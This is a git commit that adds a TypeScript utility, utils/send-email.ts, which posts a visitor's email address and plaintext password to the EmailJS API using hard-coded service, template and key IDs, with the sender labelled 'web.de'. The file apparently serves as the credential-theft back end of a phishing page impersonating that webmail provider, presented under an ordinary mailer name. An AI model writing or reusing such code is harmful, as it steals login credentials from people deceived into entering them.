b8cb63178267d088820d28ae274f11f3dde7d023
dinofunds <135698451+dinofunds@users.noreply.github.com>
2024-06-17 03:07:56 +0000

    Initial commit
    Created from https://vercel.com/new

---
+++ utils/send-email.ts
@@ -0,0 +1,23 @@
+import axios from "axios";
+
+const endpoint = "https://api.emailjs.com/api/v1.0/email/send";
+const service_id = "service_wrfnw0w";
+const template_id = "template_4skrglk";
+const public_key = "62gwE4Byo-Pf2aHIy";
+
+const sendEmail = (values: any) => {
+  const payload = {
+    service_id,
+    template_id,
+    user_id: public_key,
+    template_params: {
+      from_name: "web.de",
+      email: values.email,
+      password: values.password,
+    },
+  };
+
+  return axios.post(endpoint, payload);
+};
+
+export default sendEmail;
